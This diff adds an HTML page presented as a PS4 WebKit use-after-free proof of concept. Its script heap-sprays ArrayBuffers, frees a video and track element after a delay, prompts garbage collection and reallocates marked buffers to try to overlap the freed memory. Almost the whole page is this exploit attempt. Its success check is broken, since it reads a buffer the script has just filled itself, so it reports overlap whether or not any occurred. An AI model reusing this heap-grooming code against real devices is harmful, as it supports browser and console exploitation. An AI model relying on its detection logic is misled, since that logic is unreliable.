@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PS4 WebKit PoC - UAF Detection</title>
+  <style>
+    body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    #log { white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>PS4 WebKit PoC - UAF Detection</h1>
+  <div id="log">[+] Starting enhanced exploit...
+</div>
+
+  <script>
+    function log(msg) {
+      document.getElementById("log").textContent += msg + "\n";
+    }
+
+    const SPRAY_COUNT = 15000;
+    let spray = [];
+
+    log("[*] Starting heap spray...");
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+      let buf = new ArrayBuffer(0x100);
+      let view = new Uint32Array(buf);
+      for (let j = 0; j < view.length; j++) {
+        view[j] = 0x41414141; // Marker A
+      }
+      spray.push(buf);
+    }
+    log("[+] Heap spray complete.");
+
+    let victim = document.createElement("video");
+    let track = document.createElement("track");
+    victim.appendChild(track);
+    document.body.appendChild(victim);
+    log("[*] DOM victim created.");
+
+    setTimeout(() => {
+      victim.removeChild(track);
+      victim.remove();
+      victim = null;
+      track = null;
+      log("[*] Victim DOM removed.");
+
+      // GC suggestion
+      for (let i = 0; i < 1000; i++) {
+        let tmp = new Array(1000).fill(0);
+      }
+      log("[*] Suggested GC.");
+
+      // Realloc into possible freed memory
+      let overlap = [];
+      log("[*] Starting reallocation with new buffers...");
+      for (let i = 0; i < 500; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+        for (let j = 0; j < view.length; j++) {
+          view[j] = 0x13371337; // Marker B
+        }
+        overlap.push(view);
+      }
+
+      // Check known values for signs of reuse
+      let test = overlap[0];
+      log("[*] First buffer after reallocation:");
+      log("    view[0] = 0x" + test[0].toString(16));
+      log("    view[1] = 0x" + test[1].toString(16));
+      log("[+] If you see 0x13371337, overlap may have succeeded!");
+
+    }, 1000);
+  </script>
+</body>
+</html>
